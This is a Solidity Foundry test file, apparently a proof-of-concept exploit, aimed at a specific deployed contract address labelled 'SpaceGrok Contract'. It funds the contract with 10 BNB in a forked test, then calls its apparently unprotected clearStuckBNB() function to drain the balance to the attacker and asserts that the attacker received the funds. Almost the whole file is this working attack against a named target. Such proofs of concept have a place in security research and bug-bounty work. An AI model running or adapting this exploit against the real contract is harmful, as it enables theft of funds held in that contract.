// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x58718Fd4567517d9a713a1f9f3de6cbF9404E59e;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - the contract should already have BNB from accumulated fees
        // We'll just label the contract for clarity
        vm.label(TARGET, "SpaceGrok Contract");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Give the contract some BNB to drain
        uint256 contractBNB = 10 ether;
        deal(TARGET, contractBNB);

        // Record initial balance
        uint256 initialBalance = address(attacker).balance;

        // Call the vulnerable function to drain BNB
        (bool success, ) = TARGET.call(abi.encodeWithSignature("clearStuckBNB()"));
        require(success, "Call to clearStuckBNB failed");

        // Verify balance increased by approximately the amount we gave the contract
        uint256 finalBalance = address(attacker).balance;
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");

        // More precise check - attacker should have received the BNB we gave the contract
        // (minus any gas costs, so we use >=)
        assertGe(finalBalance, initialBalance + contractBNB - 0.1 ether, "Attacker should have received most of the BNB");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

